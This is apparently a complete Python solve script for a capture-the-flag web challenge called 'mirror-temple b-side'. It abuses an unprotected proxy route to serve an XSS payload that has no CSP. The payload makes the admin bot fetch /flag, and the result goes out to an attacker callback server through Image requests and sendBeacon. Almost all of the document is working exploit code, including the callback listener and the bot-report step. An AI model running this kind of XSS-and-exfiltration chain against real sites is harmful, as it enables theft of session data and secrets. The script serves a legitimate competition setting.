#!/usr/bin/env python3
"""
Challenge: mirror-temple b-side
Category:  web
Platform:  DiceCTF 2026

Vulnerability: Charon proxy bypasses Spring SecurityTMFilter → no CSP on /proxy responses.
Admin bot registers at localhost:8080 with the real flag (cookie scoped to localhost).
Report localhost proxy URL → admin sends cookie → XSS fetches /flag → exfiltrate.

Identical exploit to mirror-temple original (b-side only patched script-src and iframes, not the proxy).
"""
import base64
import sys
import time
import requests
import threading
import http.server
import urllib.parse

# === CONFIGURATION ===
TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://mirror-temple-b-side-22f60eddacb0.ctfi.ng"
CALLBACK_URL = sys.argv[2] if len(sys.argv) > 2 else "https://YOUR-TUNNEL.trycloudflare.com"

session = requests.Session()
session.verify = False

flag_result = []

# === CALLBACK SERVER ===
class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if "f" in params:
            flag = urllib.parse.unquote(params["f"][0])
            flag_result.append(flag)
            print(f"\n[+] FLAG (GET): {flag}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(cl).decode("utf-8", errors="replace")
        if body:
            flag_result.append(body)
            print(f"\n[+] FLAG (POST/beacon): {body}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def log_message(self, fmt, *args):
        pass

# === BUILD XSS PAYLOAD ===
def build_xss():
    html = f'''<html><body><script>
(async()=>{{
try{{
let r=await fetch("/flag");
let f=await r.text();
new Image().src="{CALLBACK_URL}/flag?f="+encodeURIComponent(f);
navigator.sendBeacon("{CALLBACK_URL}/b",f);
}}catch(e){{
new Image().src="{CALLBACK_URL}/err?e="+encodeURIComponent(e.message);
}}
}})();
</script></body></html>'''
    b64 = base64.urlsafe_b64encode(html.encode()).decode().rstrip("=")
    # httpbin.org/base64 serves the decoded content — useful HTTP host for XSS payloads
    return f"http://httpbin.org/base64/{b64}"

# === EXPLOIT ===
def exploit():
    print(f"[*] Target:   {TARGET}")
    print(f"[*] Callback: {CALLBACK_URL}")

    # Start local callback server
    srv = http.server.HTTPServer(("0.0.0.0", 9999), CallbackHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print("[*] Local callback server on :9999")

    # Step 1: Register to get JWT (needed to access /report)
    print("[*] Registering...")
    r = session.post(f"{TARGET}/postcard-from-nyc", data={
        "name": "hacker",
        "portrait": "http://example.com/x.png",
        "flag": "dice{fake}",
    }, allow_redirects=False)
    jwt = r.cookies.get("save")
    assert jwt, "Failed to get JWT — check registration"
    print(f"[+] JWT: {jwt[:50]}...")
    session.cookies.set("save", jwt)

    # Step 2: Build XSS payload hosted via httpbin base64
    xss_url = build_xss()
    print(f"[*] XSS payload URL: {xss_url[:80]}...")

    # Step 3: Report the localhost proxy URL
    # KEY: use localhost:8080 so admin bot sends its cookie (scoped to localhost)
    # Charon proxy serves our HTML without CSP headers
    report_url = f"http://localhost:8080/proxy?url={xss_url}"
    print(f"[*] Reporting: http://localhost:8080/proxy?url=<xss>")
    r = session.post(f"{TARGET}/report", data={"url": report_url})
    print(f"[+] Report response: {r.text}")

    # Step 4: Wait for admin bot to trigger XSS and exfiltrate flag
    print("[*] Waiting up to 30s for admin bot...")
    for _ in range(30):
        time.sleep(1)
        if flag_result:
            break

    if flag_result:
        print(f"\n[+] FLAG: {flag_result[0]}")
    else:
        print("\n[-] No flag received. Verify tunnel URL and callback server.")

if __name__ == "__main__":
    # Usage:
    #   python3 solve.py https://mirror-temple-b-side-HASH.ctfi.ng https://TUNNEL.trycloudflare.com
    #
    # Setup:
    #   cloudflared tunnel --url http://localhost:9999 --no-autoupdate &
    #   # Copy the tunnel URL and pass it as CALLBACK_URL
    exploit()
